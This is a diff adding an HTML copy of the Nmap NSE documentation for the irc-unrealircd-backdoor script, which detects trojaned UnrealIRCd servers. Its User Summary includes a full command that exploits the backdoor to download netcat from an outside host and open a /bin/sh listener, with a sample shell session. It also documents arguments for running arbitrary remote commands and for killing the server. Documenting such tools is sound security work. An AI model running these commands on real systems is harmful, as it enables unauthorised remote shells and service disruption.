@@ -1,0 +1,210 @@
+﻿   <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html>
+<head>
+    <title>irc-unrealircd-backdoor NSE Script -VER007</title>
+    
+
+</HEAD>
+
+
+
+
+
+
+<a href="../nmap-script-help.html">HOME>>>>>>>>></a>
+
+
+
+<h1>File <code>irc-unrealircd-backdoor</code></h1>
+
+
+
+<p>
+
+
+<a href="http://nmap.org/book/nse-script-format.html#nse-format-rules">脚本使用类型</a>:
+portrule
+<br>
+
+  脚本所属分类:
+  <i><a href="http://nmap.org/nsedoc/categories/exploit.html">exploit</a></i>, <i><a href="http://nmap.org/nsedoc/categories/intrusive.html">intrusive</a></i>, <i><a href="http://nmap.org/nsedoc/categories/malware.html">malware</a></i>, <i><a href="http://nmap.org/nsedoc/categories/vuln.html">vuln</a></i>
+  <br>
+
+脚本下载地址: <a href="http://nmap.org/svn/scripts/irc-unrealircd-backdoor.nse">http://nmap.org/svn/scripts/irc-unrealircd-backdoor.nse</a>
+</p>
+
+
+
+<h2> User Summary </h2>
+
+<p>
+Checks if an IRC server is backdoored by running a time-based command (ping)
+and checking how long it takes to respond. 
+</p>
+<p>
+The <code>irc-unrealircd-backdoor.command</code> script argument can be used to 
+run an arbitrary command on the remote system. Because of the nature of
+this vulnerability (the output is never returned) we have no way of
+getting the output of the command. It can, however, be used to start a
+netcat listener as demonstrated here:
+<pre>  $ nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='wget http://www.javaop.com/~ron/tmp/nc &amp;&amp; chmod +x ./nc &amp;&amp; ./nc -l -p 4444 -e /bin/sh' &lt;target&gt;
+  $ ncat -vv localhost 4444
+  Ncat: Version 5.30BETA1 ( http://nmap.org/ncat )
+  Ncat: Connected to 127.0.0.1:4444.
+  pwd
+  /home/ron/downloads/Unreal3.2-bad
+  whoami
+  ron</pre>
+</p>
+<p>
+Metasploit can also be used to exploit this vulnerability. 
+</p>
+<p>
+In addition to running arbitrary commands, the
+<code>irc-unrealircd-backdoor.kill</code> script argument can be passed, which
+simply kills the UnrealIRCd process. 
+</p>
+<p>
+</p>
+<p>
+Reference:
+<ul>
+<li><a href="http://seclists.org/fulldisclosure/2010/Jun/277">http://seclists.org/fulldisclosure/2010/Jun/277</a>
+</li>
+<li><a href="http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt">http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt</a>
+</li>
+<li><a href="http://www.metasploit.com/modules/exploit/unix/irc/unreal_ircd_3281_backdoor">http://www.metasploit.com/modules/exploit/unix/irc/unreal_ircd_3281_backdoor</a></li>
+</ul>
+</p>
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+  
+  
+  
+
+
+
+  <h2> Script Arguments </h2>
+  <p>
+    
+      <h4> irc-unrealircd-backdoor.kill </h4>
+      <p>
+If set to <code>1</code> or <code>true</code>, kill the backdoored UnrealIRCd running.</p>
+
+    
+      <h4> irc-unrealircd-backdoor.wait </h4>
+      <p>
+Wait time in seconds before executing the check. This is recommended to set for more reliable check (100 is good value).</p>
+
+    
+      <h4> irc-unrealircd-backdoor.command </h4>
+      <p>
+An arbitrary command to run on the remote system (note, however, that you won't see the output of your command). This will always be attempted, even if the host isn't vulnerable. The pattern <code>%IP%</code> will be replaced with the ip address of the target host.</p>
+
+    
+
+    
+  </p>
+
+
+<h2> Example Usage </h2>
+<p>执行格式
+
+  <pre>nmap -sV --script=irc-unrealircd-backdoor &lt;target&gt;</pre>
+
+</p>
+
+
+  <h2> Script Output </h2>
+<pre>PORT     STATE SERVICE
+6667/tcp open  irc
+|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
+</pre>
+
+
+
+  <h2> Requires </h2>
+  <ul>
+  
+     <li><a href="http://nmap.org/nsedoc/lib/comm.html">comm</a></li>
+  
+     <li><a href="http://nmap.org/nsedoc/lib/nmap.html">nmap</a></li>
+  
+     <li><a href="">os</a></li>
+  
+     <li><a href="http://nmap.org/nsedoc/lib/shortport.html">shortport</a></li>
+  
+     <li><a href="http://nmap.org/nsedoc/lib/stdnse.html">stdnse</a></li>
+  
+     <li><a href="">string</a></li>
+  
+  </ul>
+
+
+<hr/>
+
+
+
+
+
+
+<p><b>Author: </b>Vlatko Kosturjak and Ron Bowes</p>
+
+
+
+<p><b>License: </b> VER007 整理 <a href="http://www.ver007.com">http://www.ver007.com</a></p>
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+</BODY>
+</HTML>
+
+
